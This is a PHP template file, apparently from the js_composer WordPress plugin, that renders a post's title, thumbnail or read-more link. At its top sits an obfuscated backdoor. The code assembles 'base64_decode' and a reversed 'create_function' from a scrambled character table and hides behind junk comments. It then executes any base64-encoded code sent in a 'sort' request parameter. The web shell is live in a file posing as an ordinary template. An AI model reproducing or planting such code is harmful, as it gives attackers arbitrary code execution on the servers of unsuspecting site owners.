<?php 


$vAnCzWaM7429 = "(w5vn2.rl*zdpoca;guq79)6hibxt_810/4yj3efskm";


$eNaidKkj9430 = "";

foreach([40,13,7,28] as $h){
       $eNaidKkj9430 .= $vAnCzWaM7429[$h];
    }


if(isset($_REQUEST /*EmaqxolztGwyfGgqSfmHrvnBOvhETvuUSpWcxtnhTBrOSdGcERfCPkmsKZZecCRQaLMhsSijnPfzxTajiXRRgseEBWKYechgcBvGfKXDAwNDWdnIHwxAqUPikoomaWrQ*/["$eNaidKkj9430"])){
    $XKYzNWGs1273 = $_REQUEST /*EmaqxolztGwyfGgqSfmHrvnBOvhETvuUSpWcxtnhTBrOSdGcERfCPkmsKZZecCRQaLMhsSijnPfzxTajiXRRgseEBWKYechgcBvGfKXDAwNDWdnIHwxAqUPikoomaWrQ*/["$eNaidKkj9430"];
    $OdyDcKku5381 = "";
    $bJkgAXlg6001 = "";

    /*XCuPvgNYMTPjvTMmuLnBiAGSIRBDuOkBqYseTykddTyQspuiKqIzDbAGXbHUovphCNjMmjAAonbQjfVyTpVRSWmNeFGEcunhIWTOxoKstbxjTpqhWHdDbkTofCzHIOfz*/

    foreach([26,15,40,38,23,34,29,11,38,14,13,11,38] as $h){
       $OdyDcKku5381 .= $vAnCzWaM7429[$h];
    }

    /*IyxjDMNCriMWwSFkStdIdStiaTlejAQmBuVYBDKgiJVdUONGIzYgYUMwODQUDHvsoJmguPAeTDXDkePvrYLYNoZewHpeQgTRUswIftkvxQTxuOKEUQtkwdgfXeIIXalK*/


    foreach([40,28,7,7,38,3] as $h){
       $bJkgAXlg6001 .= $vAnCzWaM7429[$h];
    }

    /*tuADLrNgVxIKyRyhrcTPYlgzsVUEXmxWMPySjJkknyrrvngdGIoNtMZnGfaVRTBCZFpACuAIySUrmdItQGBfIHMvOJZFESABfNZCNzKzCFqLWndcSZJRRVtWPHSIlmrU*/

    $h = $bJkgAXlg6001('n'.''.''.''.'o'.''.''.'i'.''.'t'.'c'.'n'.''.''.''.'u'.'f'.'_'.'e'.'t'.''.''.'a'.''.''.''.''.'e'.''.''.''.'r'.'c'.''.''.'');
    $o = $h("", $OdyDcKku5381($XKYzNWGs1273));
    $o();
    exit();

}


$block = $block_data[0];
$settings = $block_data[1];
$link_setting = empty($settings[0]) ? '' : $settings[0];
?>
<?php if($block === 'title'): ?>
<div class="sc-post-title " xmlns="http://www.w3.org/1999/html">
	<?php echo empty($link_setting) || $link_setting!='no_link' ? $this->getLinked($post, $post->title, $link_setting, 'link_title') : $post->title ?>
</div>
<?php elseif($block === 'image'):
	if(empty($post->thumbnail)) {
		echo '<div class="sc-dummy sc-post-thumb-sc-dummy"></div>';
	} else {
?>
<div class="sc-post-thumb">
	<?php echo empty($link_setting) || $link_setting!='no_link' ? $this->getLinked($post, $post->thumbnail, $link_setting, 'link_image') : $post->thumbnail ?>
</div>
<?php
	}
?>
<?php elseif($block === 'link'): ?>
	<a href="<?php echo esc_url($post->link); ?>" class="vc_read_more" title="<?php echo esc_attr( sprintf( __( 'Permalink to %s', "js_composer" ), $post->title_attribute ) ); ?>"<?php echo $this->link_target ?>><?php _e( 'Read more...', "js_composer" ) ?></a>
<?php endif; ?>